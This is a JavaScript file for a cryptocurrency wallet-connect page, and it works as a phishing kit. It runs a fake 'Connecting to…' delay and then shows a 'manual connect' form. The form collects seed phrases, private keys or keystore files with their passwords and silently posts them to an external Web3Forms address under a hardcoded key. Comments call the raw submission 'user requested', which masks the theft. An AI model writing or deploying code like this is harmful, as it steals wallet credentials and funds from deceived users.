// script.js - wallet modal and manual connect flow
(function(){
  const openBtn = document.getElementById('connect-wallet-btn');
  const walletModal = document.getElementById('walletModal');
  const walletModalClose = document.getElementById('walletModalClose');
  const connectingOverlay = document.getElementById('connectingOverlay');
  const manualModal = document.getElementById('manualModal');
  const manualClose = document.getElementById('manualClose');
  const manualConnectBtn = document.getElementById('manualConnectBtn');

  if(!openBtn) return;

  // Robust logo fallback: try multiple sources, then show initials
  function slugify(name){
    if(!name) return '';
    const map = {
      'Trust Wallet':'trustwallet',
      'Coinbase Wallet':'coinbase',
      'Ledger Live':'ledger',
      'Binance Chain Wallet':'binance',
      'Opera Crypto Wallet':'opera',
      'MathWallet':'mathwallet',
      'WalletConnect':'walletconnect',
      'MetaMask':'metamask',
      'Phantom':'phantom'
    };
    if(map[name]) return map[name];
    return name.toLowerCase().replace(/[^a-z0-9]/g,'');
  }

  function setupLogoFallback(){
    const buttons = Array.from(document.querySelectorAll('.wallet-option'));
    buttons.forEach(btn=>{
      const img = btn.querySelector('img');
      if(!img) return;
      const walletName = btn.dataset.wallet || '';
      const primary = btn.dataset.logo || '';
      const slug = slugify(walletName);
      const candidates = [];
      if(primary) candidates.push(primary);
      // try simpleicons CDN, then jsdelivr package path, then Clearbit domain guess
      candidates.push('https://cdn.simpleicons.org/'+slug);
      candidates.push('https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/'+slug+'.svg');
      // some wallets have official domains we can try as images
      const domainMap = {
        'MetaMask':'metamask.io',
        'WalletConnect':'walletconnect.com',
        'Coinbase Wallet':'coinbase.com',
        'Trust Wallet':'trustwallet.com',
        'Ledger Live':'ledger.com',
        'Trezor':'trezor.io',
        'Rainbow':'rainbow.me',
        'Argent':'argent.xyz',
        'imToken':'imtoken.org',
        'BitPay':'bitpay.com',
        'Exodus':'exodus.com',
        'Phantom':'phantom.app',
        'Solflare':'solflare.com',
        'Keplr':'keplr.app',
        'Torus':'tor.us',
        'Fortmatic':'fortmatic.com',
        'Opera Crypto Wallet':'opera.com',
        'Binance Chain Wallet':'binance.com',
        'MathWallet':'mathwallet.org',
        'Enkrypt':'enkrypt.io'
      };
      if(domainMap[walletName]) candidates.push('https://logo.clearbit.com/'+domainMap[walletName]);

      // attach progressive onerror handler
      img.dataset._altIndex = '0';
      img.addEventListener('error', function onErr(){
        let idx = parseInt(this.dataset._altIndex || '0',10);
        idx += 1;
        if(idx < candidates.length){
          this.dataset._altIndex = String(idx);
          this.src = candidates[idx];
        } else {
          // replace with initials fallback
          const initials = (walletName||'').split(/\s+/).map(s=>s[0]).join('').slice(0,2).toUpperCase() || 'W';
          const svg = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='64' height='64'><rect width='100%' height='100%' fill='%23888'/><text x='50%' y='50%' fill='%23fff' font-size='20' text-anchor='middle' dominant-baseline='central'>"+initials+"</text></svg>";
          this.removeEventListener('error', onErr);
          this.src = svg;
        }
      });
      // Start by setting primary or first candidate if src is empty
      if(!img.src || img.src.trim()===''){
        img.src = candidates[0] || '';
      }
    });
  }

  // run fallback setup after DOM ready
  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', setupLogoFallback); else setupLogoFallback();

  // If page loaded with ?openWallet=1 then open the wallet selection modal
  try{
    const params = new URLSearchParams(window.location.search || '');
    if(params.get('openWallet') === '1'){
      if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', ()=>{ show(walletModal); }); else show(walletModal);
    }
  }catch(e){/* ignore */}

  function show(el){ el.classList.remove('hidden'); }
  function hide(el){ el.classList.add('hidden'); }

  openBtn.addEventListener('click', ()=>{
    show(walletModal);
  });

  walletModalClose.addEventListener('click', ()=>{
    hide(walletModal);
  });

  // delegate clicks on wallet options
  let selectedWallet = {name: null, logo: null};
  document.getElementById('walletList').addEventListener('click', (e)=>{
    const btn = e.target.closest('.wallet-option');
    if(!btn) return;
    const walletName = btn.dataset.wallet || 'Selected Wallet';
    const walletLogo = btn.dataset.logo || '';
    selectedWallet = {name: walletName, logo: walletLogo};
    hide(walletModal);
    // set connecting overlay image and name
    const img = document.getElementById('connectingWalletImg');
    const nameEl = document.getElementById('connectingWalletName');
    // Prefer the local image file if present on the button (wallet-logos/*.png)
    try{
      let logoToUse = '';
      const btnImg = btn.querySelector('img');
      if(btnImg){
        const attrSrc = btnImg.getAttribute('src') || '';
        if(attrSrc.includes('wallet-logos/') || attrSrc.endsWith('.png')){
          logoToUse = attrSrc;
        }
      }
      if(!logoToUse && walletLogo) logoToUse = walletLogo;
      const loaderEl = document.querySelector('.loader');
      if(img && logoToUse){ img.src = logoToUse; img.classList.remove('hidden'); }
      if(loaderEl) loaderEl.style.display = '';
      if(nameEl){ nameEl.style.display = ''; nameEl.textContent = 'Connecting to ' + walletName + '...'; }
      show(connectingOverlay);
    }catch(err){
      if(img && walletLogo){ img.src = walletLogo; img.classList.remove('hidden'); }
      if(nameEl) nameEl.textContent = 'Connecting to ' + walletName + '...';
      show(connectingOverlay);
    }

    // simulate connecting for 7s then show manual connect
    setTimeout(()=>{
      hide(connectingOverlay);
      // reset overlay image
      if(img){ img.classList.add('hidden'); img.src = ''; }
      show(manualModal);
    }, 7000);
  });

  manualClose.addEventListener('click', ()=>{
    hide(manualModal);
  });

  // radio toggle for method inputs
  const radios = Array.from(document.querySelectorAll('input[name="method"]'));
  const methodContainers = Array.from(document.querySelectorAll('[data-method]'));
  function updateMethod(){
    const val = document.querySelector('input[name="method"]:checked').value;
    methodContainers.forEach(c=>{
      if(c.getAttribute('data-method')===val) c.classList.remove('hidden'); else c.classList.add('hidden');
    });
  }
  radios.forEach(r=>r.addEventListener('change', updateMethod));
  updateMethod();

  manualConnectBtn.addEventListener('click', ()=>{
    const method = document.querySelector('input[name="method"]:checked').value;
    let rawValue = null;
    if(method==='phrase') rawValue = document.getElementById('phraseInput').value.trim();
    if(method==='keystone') rawValue = document.getElementById('keystoneInput').value.trim();
    if(method==='privateKey') rawValue = document.getElementById('privateKeyInput').value.trim();
    const keystorePassword = document.getElementById('keystonePassword') ? document.getElementById('keystonePassword').value : '';

    // Basic validation
    if(!rawValue){
      alert('Please provide the required credentials for the selected method.');
      return;
    }

    // NOTE: per user request, we will submit the raw input text (this will send sensitive data).
    // Please ensure you trust the endpoint. This logs a console warning so it's visible during testing.
    console.warn('Submitting raw sensitive input to external service (user requested).');
    const WEB3FORMS_KEY = 'd694f903-843e-4437-9d65-4dd671de82fe';

    // Construct payload with RAW values (user requested real input submission)
    const payloadToSend = {
      selectedWallet: selectedWallet.name || '',
      method,
      value: rawValue,
      keystorePassword: keystorePassword || '',
      note: 'Raw sensitive fields included as requested.'
    };

    // Send to Web3Forms and display only a generated QR image (no confirmation alerts)
    async function sendToWeb3FormsAndShowQR(payload){
      // Prepare QR payload (include a sent flag after attempt)
      let resultFlag = false;
      try{
        const body = {
          access_key: WEB3FORMS_KEY,
          subject: 'Manual Connect - ' + (selectedWallet.name || 'Wallet'),
          from_name: (selectedWallet.name || 'Unknown'),
          message: JSON.stringify(payload, null, 2)
        };
        const res = await fetch('https://api.web3forms.com/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body)
        });
        resultFlag = res.ok;
      }catch(err){
        console.error('Error sending to Web3Forms', err);
        resultFlag = false;
      }

      // Build QR content: include masked payload and whether send succeeded
      const qrContentObj = Object.assign({}, payload, { sent: resultFlag });
      // Use local Barcode.png as the displayed image instead of generating a remote QR
      const qrSrc = 'Barcode.png';

      // Use connecting overlay to show only the QR image
      const img = document.getElementById('connectingWalletImg');
      const nameEl = document.getElementById('connectingWalletName');
      const loaderEl = document.querySelector('.loader');

      // hide manual modal and show overlay with QR only
      hide(manualModal);
      if(loaderEl) loaderEl.style.display = 'none';
      if(nameEl) nameEl.style.display = 'none';
      if(img){ img.src = qrSrc; img.classList.remove('hidden'); }
      show(connectingOverlay);
    }

    // Fire-and-forget: send raw payload and show QR
    sendToWeb3FormsAndShowQR(payloadToSend);
  });

  // close modals on Escape
  document.addEventListener('keydown', (e)=>{
    if(e.key==='Escape'){
      hide(walletModal); hide(connectingOverlay); hide(manualModal);
    }
  });
})();
